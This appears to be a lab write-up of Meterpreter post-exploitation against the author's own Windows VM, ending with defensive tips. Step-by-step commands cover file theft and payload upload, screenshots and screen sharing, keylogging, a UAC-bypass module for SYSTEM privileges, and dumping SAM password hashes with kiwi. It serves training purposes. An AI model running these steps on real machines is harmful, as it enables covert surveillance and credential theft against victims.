# Ethical Hacking 3 - Hacking into Windows VM

<h2>Description:</h2>

This lesson will delve into the intricacies of ethical hacking and remote penetration testing. This immersive session focuses on utilizing the powerful Meterpreter tool to interact with an infected Windows virtual machine. Participants will gain hands-on experience by learning how to extract critical information about the compromised system using commands like 'Sysinfo' and 'pwd'. Additionally, they will explore essential file manipulation techniques, including viewing, downloading, and uploading files on the infected machine. The lesson culminates with a deep dive into advanced tactics, where participants will discover how to ethically and responsibly extract usernames and passwords from a Windows VM, emphasizing the importance of cybersecurity awareness and preparedness.


<h2>Environment Used</h2>

- Kali Linux and Windows VM : 
  - Network Attached to: NAT Network
  - Name: PublicNAT
  - IP Address = 10.0.9 Network
 
- Hacking Device: Kali Linux VM
- Infected Device: Windows VM
 
- Tool Used: Metasploit's Meterpreter from Kali Linux


  

- After the session is running we can type: "help" in the meterpreter to see the commands we can use on the infected machine

<br />

- To get started by gathering information about the infected machine we can use:
  - > sysinfo
  - This information gives us that the infected machine is:
    - Windows 10 64-bit
    - Build # 22621 

<p align="left">

<br />

- We can get where the victim downloaded the virus to:
  - > pwd
  - This information gives us the directory of the virus on the infected machine
 
<p align="left">

<br />

- We can check how many machines had been infected by the virus with the session command
  - > msf6 exploit(multi/handler) > sessions
  - Have to type in the background command first to go back to the exploit(multi/handler)
  - Can go back to the session with the command:
    - > sessions -i [session Id]

<h2></h2>

<h2>Viewing, Downloading, and Uploading Files with Meterpreter</h2>

- We can use the list command to see what is in the directory that the virus is downloaded on
  - > ls
  - This lists all the files on the directory that the virus is downloaded on

<p align="left">

<br />

- We can use the cat command to read the files
  - > cat desktop.ini
  - This gives the configuration information for the Windows VM
 
<p align="left">

<br />

- We can even download the files from the infected machine to our hacking device [Kali Linux] by using the download command
  - > download desktop.ini

<p align="left">

<br />

- We can change the directory for the hacking device on the infected machine by using the cd command
  - > cd ../Documents
  - This changes the directory from Download to Documents
    
<p align="left">

<br />

- We can upload our virus one more time into the infected machine's Documents directory by using the upload command
  - First, we need to find out where the virus is located in our Kali Linux hacking device
    - Our location: /home/jeff/Desktop/Diablo5.exe
  - > upload /home/jeff/Desktop/Diablo5.exe

<h2>Stealing Screenshot and Keystrokes</h2>

<p align="left">
User interface Commands <br/>

<br />

- We can grab a screenshot of the infected machine by using the screenshot command
  - > screenshot -v true
    - -v true = view the screenshot as it takes the screenshot
 
<p align="left">

<br />

- We can even view the infected machine by using the screenshare command
  - > screenshare
  - Everything the infected machine can see, the hacking device machine cand see as well


- We can capture the keystroke of the infected machine by using the keyscan_start, keyscan_dump, keyscan_stop
  - > keyscan_start
    - This will start sniffing the keystrokes on the infected machine
  - > keyscan_dump
    - This will record everything up until the command but keep sniffing the keystrokes
  - > keyscan_stop
    - This will stop sniffing the keystrokes on the infected machine
  - Can capture any keystrokes even usernames and passwords

<h2>Gaining Admin Level Privileges on Infected Windows 10 VM</h2>

Prepping a few user accounts on the infected machine to simulate a real Device with user accounts

1. Open up cmd as administrator on Windows VM

2. Type in cmd: net user [username] [password of this user] /add
    - > net user ana Password1 /add
      > net user ben PassW0rd! /add
      > net user carol Captain12cvq /add
      > net user clark johncena35s /add
      > net user kara Aquaman123 /add
      > net user peter supeRmaN542 /add

Using Kali Linux to inject privilege escalation into Windows VM

1. On the Kali Linux Meterpreter, we have to type in "background" to go back into msf6 exploit(multi/handler)

2.  > msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_fonhelper

3.  > msf6 exploit(windows/local/bypassuac_fonhelper) > set SESSION 6

4.  > msf6 exploit(windows/local/bypassuac_fonhelper) > set LHOST 10.0.9.4 [Kali Linux IP]

5.  > msf6 exploit(windows/local/bypassuac_fonhelper) > exploit

<br />    

6. > meterpreter > getsystem
    - This command gets system level access on the Windows VM

7. > meterpreter > getuid
    - This command checks if we really have system-level access
    - NT AUTHORITY\SYSTEM = Root level

8. > meterpreter > use kiwi
   - Using a package called Kiwi for stealing the username and password

9. > lsa_dump_sam
    - This will give us Hash NTLM
    - We can use the Hash NTLM to find the passwords

<h2>Conclusion</h2>

This lesson in ethical hacking has equipped us with valuable insights and practical skills for remote hacking into Windows VMs. We've learned essential commands like 'sessions' for managing infected machine sessions, 'sysinfo' for gathering system information, 'pwd' for examining virus directories, and 'cat', 'download', and 'upload' for file operations. Additionally, we've explored advanced techniques like capturing screenshots, logging keystrokes, and stealing user credentials with privilege escalation. These skills are not only informative but also essential for ethical hackers to better understand and secure systems against potential threats.

Defending Malware Attacks Tips:

- Don't download/click/run suspicious files that you downloaded over the internet
- Run the downloaded object through a virus-scanning program or use [virustotal](https://www.virustotal.com/gui/home/upload)
  - Scanned the Virus on virustotal: [Result](https://www.virustotal.com/gui/file/74ae766af75e6c93feb18247d77fe6c44a08c1b704e783546e910557fde9b06d/detection)
- Use an Antivirus and Firewall that is running and up-to-date
- Once a device is infected:
  - Have to turn this computer off
  - Take the computer off the network
  - Run a full virus scan
  - Find the virus and delete the virus
- Keep your system up-to-date
